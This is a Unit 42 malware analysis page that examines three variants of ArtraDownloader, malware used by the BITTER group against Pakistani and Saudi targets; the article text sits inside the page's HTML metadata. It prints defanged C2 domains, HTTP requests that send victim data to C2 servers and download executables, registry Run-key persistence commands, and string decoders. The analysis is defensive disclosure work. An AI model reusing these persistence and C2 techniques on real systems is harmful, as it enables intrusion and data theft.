
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>Multiple ArtraDownloader Variants Used by BITTER to Target Pakistan</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Multiple ArtraDownloader Variants Used by BITTER to Target Pakistan" />
<meta property="og:description" content="Since at least 2015, a suspected South Asian threat grouping known as BITTER has been targeting Pakistan and Chinese organizations using variants of a previously unreported downloader. We have named this malware family ArtraDownloader. Starting in September 2018 and continuing through the beginning of 2019, BITTER launched a wave of attacks targeting Pakistan and Saudi Arabia. This is the first reported instance of BITTER targeting Saudi Arabia." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="artradownloader" />
<meta property="article:tag" content="Bitter" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2019-02-25T14:00:06+00:00" />
<meta property="article:modified_time" content="2019-03-14T19:07:41+00:00" />
<meta property="og:updated_time" content="2019-03-14T19:07:41+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/02/Figure-1-Timeline-of-ArtraDownloader-variants-based-on-compile-timestamps.png" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/02/Figure-1-Timeline-of-ArtraDownloader-variants-based-on-compile-timestamps.png" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="Since at least 2015, a suspected South Asian threat grouping known as BITTER has been targeting Pakistan and Chinese organizations using variants of a previously unreported downloader. We have named this malware family ArtraDownloader. Starting in September 2018 and continuing through the beginning of 2019, BITTER launched a wave of attacks targeting Pakistan and Saudi Arabia. This is the first reported instance of BITTER targeting Saudi Arabia." />
<meta name="twitter:title" content="Multiple ArtraDownloader Variants Used by BITTER to Target Pakistan" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/02/Figure-1-Timeline-of-ArtraDownloader-variants-based-on-compile-timestamps.png" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; Multiple ArtraDownloader Variants Used by BITTER to Target Pakistan Comments Feed" href="https://unit42.paloaltonetworks.com/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/feed/" />
<meta property="og:likes" content="2"/>
<meta property="og:readtime" content="10"/>
<meta property="og:views" content="29,867"/>
<meta property="og:date_created" content="February 25, 2019 at 6:00 AM"/>
<meta property="og:post_length" content="3049"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit-42/"/>
<meta property="og:author" content="Josh Grunzweig"/>
<meta property="og:author" content="Brittany Barbehenn"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/joshgruznweig/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/brittany-ash/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Multiple ArtraDownloader Variants Used by BITTER to Target Pakistan","name":"Multiple ArtraDownloader Variants Used by BITTER to Target Pakistan","description":"Since at least 2015, a suspected South Asian threat grouping known as BITTER has been targeting Pakistan and Chinese organizations using variants of a previously unreported downloader. We have named this malware family ArtraDownloader. Starting in September 2018 and continuing through the beginning of 2019, BITTER launched a wave of attacks targeting Pakistan and Saudi Arabia. This is the first reported instance of BITTER targeting Saudi Arabia.","url":"https:\/\/unit42.paloaltonetworks.com\/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan\/","datePublished":"February 25, 2019","articleBody":"Executive Summary\r\nSince at least 2015, a suspected South Asian threat grouping known as BITTER has been targeting Pakistan and Chinese organizations using variants of a previously unreported downloader. We have named this malware family ArtraDownloader based on a PDB string discovered within the samples. We\u2019ve observed three variants of this downloader with the earliest timestamp of February 2015.\u00a0 This downloader has frequently been observed downloading the Remote Access Trojan (RAT) BitterRAT which is associated with BITTER threat operations.\r\n\r\nStarting in September 2018 and continuing through the beginning of 2019, BITTER launched a wave of attacks targeting Pakistan and Saudi Arabia. This is the first reported instance of BITTER targeting Saudi Arabia. Details surrounding these attacks and the three ArtraDownloader variants observed are described below.\r\nActivities\r\nBetween mid-September 2018 and January 2019, Unit 42 observed the ArtraDownloader used in the targeting of Pakistan and Saudi Arabian organizations. Several malicious documents have been identified, all communicating with likely compromised, legitimate Pakistan websites to retrieve the payload. These websites include those associated with the Pakistan government and other Pakistan organizations.\r\n\r\nBeginning on Sep 12, 2018, we observed files with the following names hosted on the URL https:\/\/wforc[.]pk\/js\/.\r\n\r\n \tInternet Data Traffic Report \u2013 August 2018.docx\r\n \tPAF Webmail Security Report.doc.exe\r\n\r\nThe presumed spear phish targeted an employee of\u00a0 an organization\u00a0 in Saudi Arabia. The malicious file communicated with the C2 nethosttalk[.]com.\r\n\r\nAround the same timeframe, two additional files (listed below) were observed being hosted on another Pakistan website. These executables, which had the following names, were hosted on the URL khurram.com[.]pk\/js\/drvn and communicated with the domain nethosttalk[.]com for C2.\r\n\r\n \tHandling of Logistics.pdf[.]com\r\n \tCyber security work shop.pdf[.]com\r\n\r\nBeginning on Nov 6, 2018, the URL http:\/\/rmmun.org[.]pk\/svch was observed hosting two ArtraDownloader files that communicated with the domains info.viewworld71[.]com or hewle.kielsoservice[.]net.\u00a0 The RMMUN, Roots Metropolitan Model United Nations, is an organized event that was held on November 8-11, 2018 which fosters collaboration and insights into issues such as human rights and economic development.\r\n\r\nBetween November 2018 and January 2019, an engineering and hydraulics company in Pakistan, almasoodgroup[.]com was observed hosting two AtraDownloader executables as well as a malicious document used to deliver a payload.\u00a0 One of the files, Port Details.doc is an RTF document crafted to exploit the EQNEDT vulnerability CVE-2017-11882. This file downloaded a payload that also communicated with the domain hewle.kielsoservice[.]net. The other two files hosted on the engineering company\u2019s domain communicated with command and control domain xiovo426[.]net.\r\n\r\nOn 2 Jan 19, the file article_amy.doc was also uploaded into VirusTotal. This document was hosted on almasoodgroup[.]com\/js\/cwqj and communicated with C2 domain thepandaservices.nsiagenthoster[.]net. The domain almasoodgroup[.]com appears to be a legitimate but compromised domain in this particular instance.\r\n\r\nOn December 17 and 18 2018, a file was downloaded from http:\/\/fst.gov[.]pk\/images\/winsvc (SHA256: ef0cb0a1\u2026) after a user accessed the document cocktail and the dinner in the last week of dec.doc. We do not know how the user was initially enticed to execute this document. This payload is an instance of ArtraDownloader variant 1 exploits CVE-2017-11882 (EQNEDT). In this case it was observed using the command and control domain of hewle.kielsoservice[.]net\/Engset.php.\r\nVariant Comparison\r\nIn total, roughly 80 unique instances of the ArtraDownloader malware family have been discovered. Within these samples, 3 distinct variants are identified. These variants generally have minor changes between them, specifically as it pertains to string obfuscation, as well as HTTP requests.\r\n\r\nThe earliest sample identified belonging to ArtraDownloader has a compile timestamp of February 2015, which provides a rough outline as to how old this malware family is.\r\n\r\nTo date, Unit 42 has only observed this malware family downloading and executing instances of the RAT malware family associated with BITTER. A breakdown as to when each identified sample was compiled is as follows:\r\n\r\n\r\nFigure 1 Timeline of ArtraDownloader variants based on compile timestamps\r\nOverall, the ArtraDownloader malware family is not sophisticated, leveraging simple registry keys for persistence and HTTP requests to download and execute a remote file. Important strings within these samples are obfuscated by adding or subtracting from each byte within a string. This same obfuscation routine is used when sending data via HTTP.\r\n\r\nOf interest, during this analysis we discovered infrastructure use overlap seen in a previously analyzed payload. In November 2017 we reported on malicious documents that were downloaded from the domain zmwardrobe[.]com and subsequently executed a payload referred to as MY24. This activity was observed through September and October 2017. In November 2017, we first observed ArtraDownloader querying the same domain; this continuing through February 2018. Both payloads were observed in InPage exploits.\r\n\r\nFor more information about the variants discovered and an in-depth analysis on each, please refer to the Appendix.\r\nConclusion\r\nTo date, the threat actor commonly referred to as BITTER continues to be active against various regions across the globe. They are observed targeting Pakistan, China, and Saudi Arabia using a customized downloader malware family named ArtraDownloader. This downloader, leveraging unique custom obfuscation routines downloads and executes the BitterRAT malware family via HTTP.\r\n\r\nMultiple organizations have been affected or found to be hosting the malware used by BITTER, including the Pakistan government, an engineering company, and an electrical provider. We will continue to monitor this threat actor in the future. Palo Alto Networks customers are protected against this threat in the following ways:\r\n\r\n \tAll malware is appropriately classified as malicious in WildFire\r\n \tDomains being used for communication by malware and URLs hosting malware are flagged as malicious\r\n \tAutoFocus customers may use the BITTER, BITTERRAT, and ArtraDownloader tags for continued tracking of this threat.\r\n\r\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit cyberthreatalliance.org.\r\nAppendix\r\nArtraDownloader Malware Analysis \u2013 Variant 1\r\nFor the remainder of the analysis, the following file is used:\r\n\r\n\r\n\r\nMD5\r\n7cc0b212d1b8ceb808c250495d83bae4\r\n\r\n\r\nSHA1\r\nd2c161ce52240b61d632607a2262890327d82502\r\n\r\n\r\nSHA256\r\nef0cb0a1a29bcdf2b36622f72734aec8d38326fc8f7270f78bd956e706a5fd57\r\n\r\n\r\nCompile Timestamp\r\n2018-12-06 11:14:45 UTC\r\n\r\n\r\n\r\nTable 1 ArtraDownloader Variant 1 Sample\r\n\r\nUpon execution, the sample will create and register a new window class with the following properties:\r\n\r\nWindow Name: seal\r\n\r\nClass Name: SEAL\r\n\r\nUpon receiving a WM_CREATE message in this newly created window class, it will execute a new function after 20 seconds via a call to SetTimer(). This function is responsible for actually downloading and executing a remote payload and will only be called at the end of the malware\u2019s execution.\r\n\r\nArtraDownloader continues to collect the following information from the victim machine:\r\n\r\n \tComputer name\r\n \tOperating system\r\n \tUsername\r\n\r\nThroughout the malware\u2019s execution, various strings are encoded to avoid detection. The following Python code may be used to decode these strings:\r\n\r\ndef decode(data):\r\nout = \"\"\r\nfor d in data:\r\nout += chr(ord(d)-1)\r\nreturn out\r\nExample:\r\n&gt;&gt; print(decode(\"ifxmf\/ljfmtptfswjdf\/ofu\"))\r\n&gt;&gt; hewle.kielsoservice[.]net\r\nIt then attempts to acquire the following folder paths. The first successfully identified folder will be used.\r\n\r\n \tTEMPLATES\r\n \tNETHOOD\r\n \tAPPDATA\r\n\r\nThe ctfmon.exe file is appended to this path, which will be the destination ArtraDownloader copies itself too in the event this file does not already exist.\r\n\r\nThe malware then attempts to acquire the following folder paths. The first successfully identified folder will be used.\r\n\r\n \tNETHOOD\r\n \tTEMPLATES\r\n \tAPPDATA\r\n\r\nThe perfc file is appended to this path, which will be the temporary destination the malware uses when downloading a remote file.\r\n\r\nThe downloader proceeds to identify the victim\u2019s machine GUID via the HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid registry key. If this key is successfully queried, a string with the following data is formatted:\r\n\r\n[Computer Name]##[Username]@@[Machine GUID]\r\n\r\nOtherwise, the following string is generated:\r\n\r\n[Computer Name]!@[Username]\r\n\r\nThis information will be used in subsequent network requests. In order to ensure persistence, the malware modifies the host\u2019s registry to accomplish this. The following two keys are set:\r\n\r\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\JITDfbug - \"cmd \/c start %Qrp% &amp;&amp; exit\"\r\n\r\nHKCU\\Environment\\Qrp - [path]\\ctfmon.exe\r\n\r\nWhere [path] is the previously chosen path where ArtraDownloader has copied itself. These two registry key modifications ensure that the malware executes every time the victim machine starts.\r\n\r\nAt this point in the malware\u2019s execution flow, the previously discussed function that is executed on a 20 second timer will ultimately run. It will begin by making the following example POST request to the remote C2 server:\r\n\r\nPOST \/Engset.php HTTP\/1.0\r\n\r\nHost: hewle.kielsoservice[.]net\r\n\r\nConnection: keep-alive\r\n\r\nContent-type: application\/x-www-form-urlencoded\r\n\r\nContent-length: 148\r\n\r\n&nbsp;\r\n\r\nBCDEF=XJO.82GO2QF2BU9&amp;MNOPQ=Xjoepxt!8!Vmujnbuf&amp;GHIJ=Kpti!Hsvo{xfjh&amp;UVWXYZ=XJO.82GO2QF2BU9$$Kpti!Hsvo{xfjhAA214cf8g5.cgc9.51gb.914d.f17ceg:e4cc7&amp;st=0\r\n\r\nIn this request, the POST data is encoded using the same technique witnessed on the strings. Upon decoding them, we are presented with the following:\r\n\r\n\r\n\r\nPOST Variable\r\nDescription\r\nDecoded Example\r\n\r\n\r\nBCDEF\r\nHostname\r\nWIN-71FN1PE1AT8\r\n\r\n\r\nMNOPQ\r\nMicrosoft Windows Version\r\nWindows 7 Ultimate\r\n\r\n\r\nGHIJ\r\nUsername\r\nJosh Grunzweig\r\n\r\n\r\nUVWXYZ\r\nPreviously created string used as a unique identifier for the victim\r\nWIN-71FN1PE1AT8##Josh Grunzweig@@103be7f4-bfb8-40fa-803c-e06bdf9d3bb6\r\n\r\n\r\nst\r\nBoolean value indicating if previously downloaded file executed successfully.\r\n0\r\n\r\n\r\n\r\nTable 2 Decoded POST requests in ArtraDownloader Variant 1\r\n\r\nThe expected response is as follows, where \u2018qbzmpbe\u2019 is the example encoded executable name (decoded: \u2018payload\u2019) that will be downloaded and executed:\r\n\r\nDFCB=DWN qbzmpbe&lt;br&gt;\r\n\r\nAfter the expected response is returned by the remote C2 server, ArtraDownloader will make the following POST request:\r\n\r\nThe above example request is using the same unique identifier that was witnessed in the previous request\u2019s UZWXYZ POST variable.\r\n\r\nThe remote C2 server expects the response to be of the following format:\r\n\r\nexe[hex-encoded data]&amp;lt\r\n\r\nWhere [hex-encoded data] is the hex-encoded payload binary. The raw response is written to the perfc file, such as in the following example from a mock C2 server:\r\n\r\nHTTP\/1.0 200 OK\r\n\r\nContent-Type: text\/html; charset=utf-8\r\n\r\nContent-Length: 28\r\n\r\nServer: Werkzeug\/0.12.2 Python\/2.7.15\r\n\r\nDate: Tue, 08 Jan 2019 18:46:23 GMT\r\n\r\n&nbsp;\r\n\r\nexe68656c6c6f20776f726c64&amp;lt\r\n\r\nAfter this file is written, the malware proceeds to decode the hex-encoded data and writes this to the previously defined filename in the same path as perfc. In our example from earlier, since payload was provided as the filename, this particular payload would be written to payload.exe. Using our example from the mock server, this file would contain the string hello world.\r\n\r\nAt this stage, the malware proceeds to open this newly created executable in a new process via a call to ShellExecuteA().\u00a0 Should this be successful, ArtraDownloader will make a subsequent HTTP request to \/Engset.php with the same POST parameters. However, in this request, the st POST variable is set to 1.\r\nArtraDownloader Malware Analysis \u2013 Variant 2\r\nFor the remainder of the analysis, the following file is used:\r\n\r\n\r\n\r\nMD5\r\n8d42c01180be7588a2a68ad96dd0cf85\r\n\r\n\r\nSHA1\r\n89a7861acb7983ad712ae9206131c96454a1b3d8\r\n\r\n\r\nSHA256\r\n0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0\r\n\r\n\r\nCompile Timestamp\r\n2019-01-07 07:13:47 UTC\r\n\r\n\r\nPDB String\r\nc:\\Users\\Asterix\\Documents\\Visual Studio 2008\\Projects\\28NovDwn\\Release\\28NovDwn.pdb\r\n\r\n\r\n\r\nTable 3 ArtraDownloader Variant 2 Sample\r\n\r\nUpon execution, the sample will create and register a new window class with the following properties:\r\n\r\nWindow Name: 28NovDwn\r\n\r\nClass Name: MY28NOVDWN\r\n\r\nThe malware proceeds to decode a series of strings using a simple routine. The following Python script may be used to decode strings belonging to this cluster:\r\n\r\ndef decode(data):\r\nout = \"\"\r\nfor d in data:\r\nout += chr((ord(d)-3)&amp;0xFF)\r\nreturn out\r\n&gt;&gt; print(decode(\u201ciudphzrunvxssruw1qhw\u201d))\r\n\r\n&gt;&gt; frameworksupport[.]net\r\n\r\nIt proceeds to attempt to create the C:\\intel\\ directory, which is where various files will eventually be stored. It creates the following registry if it doesn\u2019t already exist with the intent of persisting on the victim machine:\r\n\r\nHKCU\\Environment\\AppId \u2013 c:\\intel\\msdtcv.exe\r\n\r\nArtraDownloader then sets the following registry key to ensure that the malware executes across reboots.\r\n\r\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \u2013 cmd \/c start %AppId% &amp;&amp; exit\r\n\r\nAdditionally, in a separate thread, the malware will spawn a new process to copy itself to the C:\\intel\\msdtcv.exe path.\r\n\r\nVarious information about the victim machine is collected, including information about the operating system, the machine\u2019s GUID, as well as the hostname. This information will ultimately be used to both identify the victim and provide general information about the infected host.\r\n\r\nThe following example GET request is made to the remote C2 server:\r\n\r\nGET \/ourtyaz\/qwe.php?TIe=214cf8g5.cgc9.51gb.914d.f17ceg%3ae4cc7*XJO.82GO2QF2BU9*%3aACme%3b%217%2f2%2f8712%21Tfswjdf%21Qbdl%212 HTTP\/1.1\r\n\r\nHost: frameworksupport[.]net\r\n\r\nConnection: close\r\n\r\nIn the example request above, the data supplied in the TIe GET variable is separated by a * and the remaining data is encoded by adding one to each byte. Decoding this string, we are presented with the following:\r\n\r\n103be7f4-bfb8-40fa-803c-e06bdf9d3bb6*WIN-71FN1PE1AT8*9@Bld: 6.1.7601 Service Pack 1\r\n\r\nThe data above includes the machine\u2019s GUID, the victim\u2019s hostname, as well as information about the operating system. This particular GET request is looking for the AXE: identifier, as witnessed in the following C2 response:\r\n\r\nHTTP\/1.1 200 OK\r\n\r\nX-Powered-By: PHP\/5.6.36\r\n\r\nContent-Type: text\/html; charset=UTF-8\r\n\r\nContent-Length: 23\r\n\r\nDate: Tue, 20 Nov 2018 22:27:56 GMT\r\n\r\nAccept-Ranges: bytes\r\n\r\nServer: LiteSpeed\r\n\r\nConnection: close\r\n\r\n&nbsp;\r\n\r\nAXE: #wscspl#\r\n\r\nSIZE: ##\r\n\r\nIn this response, the data between the # is parsed, and a subsequent request is made. Should this information be present in the response, the malware will query the CSIDL_HISTORY folder, which represents the file system directory that serves as a common repository for Internet history items. This path has the string ZX appended to it, followed by the filename used in the HTTP response, which in our example was wscspl. An example of this is as follows:\r\n\r\nC:\\Users\\[username]\\AppData\\Local\\Microsoft\\Windows\\HistoryZXwscspl\r\n\r\nThe HTTP request for data that will be supplied to this newly formed file path is as follows:\r\n\r\nGET \/ergdfbd\/wscspl HTTP\/1.1\r\n\r\nHost: frameworksupport[.]net\r\n\r\nConnection: Close\r\n\r\nThe entire HTTP response is written to the previously described file path. ArtraDownloader will then parse this entire HTTP response\u2019s POST data, extracting everything at offset 0x1 to a file path without the ZX characters, and with the .exe extension. Using our previous example, this file would be the following:\r\n\r\nC:\\Users\\[username]\\AppData\\Local\\Microsoft\\Windows\\Historywscspl.exe\r\n\r\nThe previously written file containing ZX in the path is removed. Finally, this file is executed in a new process. If this executable is spawned without errors, the malware will send the following example final HTTP request:\r\n\r\nGET \/ourtyaz\/dwnack.php?cId=214cf8g5.cgc9.51gb.914d.f17ceg%3ae4cc7 HTTP\/1.1\r\n\r\nHost: frameworksupport[.]net\r\n\r\nConnection: Close\r\nArtraDownloader Malware Analysis \u2013 Variant 3\r\nFor the remainder of the analysis, the following file is used:\r\n\r\n\r\n\r\nMD5\r\na1bdb1889d960e424920e57366662a59\r\n\r\n\r\nSHA1\r\n177837d0fa5bfd274abe79d80a01cfe2374b4cd9\r\n\r\n\r\nSHA256\r\nf0ef4242cc6b8fa3728b61d2ce86ea934bd59f550de9167afbca0b0aaa3b2c22\r\n\r\n\r\nCompile Timestamp\r\n2018-07-30 09:18:37 UTC\r\n\r\n\r\nPDB String\r\nd:\\C++\\new_downloader_aroundtheworld123\\Release\\audiodq.pdb\r\n\r\n\r\n\r\nTable 4 ArtraDownloader Variant 3 Sample\r\n\r\nUpon execution, the malware begins by decoding a series of strings via a simple decoding routine. The following Python script may be used to decode strings belonging to this cluster:\r\n\r\ndef decode(data):\r\nout = \"\"\r\nfor d in data:\r\nout += chr((ord(d)-13)&amp;0xFF)\r\nreturn out\r\n&nbsp;\r\n\r\n&gt;&gt; print(decode(binascii.unhexlify(\"6E7F7C827B71817572847C7F79713E3F403B7B7281\")))\r\n\r\n&gt;&gt; aroundtheworld123[.]net\r\n\r\n&nbsp;\r\n\r\nThe malware proceeds to check to determine if the AVG security product is currently running on the system, however, this information does not appear to be used by ArtraDownloader. It is possible that this might have been a remnant of testing being performed by the malware author that was unintentionally left within the sample.\r\n\r\nVarious information about the system is collected by the malware and used in subsequent HTTP requests. After this information is collected, the following example HTTP GET request is performed:\r\n\r\nGET \/\/\/healthne\/accept.php?a=WIN-71FN1PE1AT8&amp;b=WIN-71FN1PE1AT8&amp;c=Windows%207%20Ultimate&amp;d=Josh GrunzweigJosh Grunzweig103be7f4-bfb8-40fa-803c-e06bdf9d3bb6365536040965860&amp;e= HTTP\/1.1\r\n\r\nHost: aroundtheworld123[.]net\r\n\r\nNote that unlike other variants witnessed in this malware family, this particular variant does not obfuscate data being sent across the network. The following GET parameters are used within this request:\r\n\r\n\r\n\r\nGET Variable\r\nDescription\r\n\r\n\r\na\r\nHostname\r\n\r\n\r\nb\r\nComputer name\r\n\r\n\r\nc\r\nOperating system version\r\n\r\n\r\nd\r\nUnique string containing two instances of the victim\u2019s username, the machine\u2019s GUID, as well as various information queried via a call to GetSystemInfo()\r\n\r\n\r\ne\r\nA variable that does not appear to be used within this particular sample\r\n\r\n\r\n\r\nTable 5 GET Parameters Observed in ArtraDownloader Variant 3\r\n\r\nAn example response to this request can be seen below.\r\n\r\nHTTP\/1.1 200 OK\r\n\r\nContent-Type: text\/html; charset=UTF-8\r\n\r\nContent-Length: 29\r\n\r\nDate: Mon, 05 Nov 2018 19:22:56 GMT\r\n\r\nAccept-Ranges: bytes\r\n\r\nServer: LiteSpeed\r\n\r\nConnection: Keep-Alive\r\n\r\n&nbsp;\r\n\r\nYes file58368[regdl]35No file\r\n\r\nThe response to this request is parsed, specifically attempting to identify the string Yes file. Should this string be present, the data between [ and ] is parsed. This data is used in a subsequent HTTP request made that will download a file from the remote server, as seen below:\r\n\r\nGET \/healthne\/healthne\/regdl HTTP\/1.0\r\n\r\nHost: aroundtheworld123[.]net\r\n\r\n&nbsp;\r\n\r\nHTTP\/1.0 200 OK\r\n\r\nLast-Modified: Tue, 02 Oct 2018 04:38:28 GMT\r\n\r\nContent-Type: application\/octet-stream\r\n\r\nContent-Length: 58368\r\n\r\nDate: Mon, 05 Nov 2018 19:23:01 GMT\r\n\r\nAccept-Ranges: bytes\r\n\r\nServer: LiteSpeed\r\n\r\nConnection: close\r\n\r\n&nbsp;\r\n\r\nMZ......................[TRUNCATED]\r\n\r\nThis executable file is written to the same directory as the malware and uses the same name provided. As an example, should this malware originally be executed from C:\\, the downloaded file would be written to C:\\regdl.exe. Finally, this executable is run in a new process.\r\nIndicators of Compromise\r\nPlease refer to the following link for a CSV file containing all relevant IOCs:\r\n\r\nhttps:\/\/github.com\/pan-unit42\/iocs\/tree\/master\/bitter\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n&nbsp;","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"","width":"","height":""},"author":[{"@type":"Person","name":"Josh Grunzweig"},{"@type":"Person","name":"Brittany Barbehenn"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"96323","token":"b09d8c8c9d","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=96323' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fmultiple-artradownloader-variants-used-by-bitter-to-target-pakistan%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fmultiple-artradownloader-variants-used-by-bitter-to-target-pakistan%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
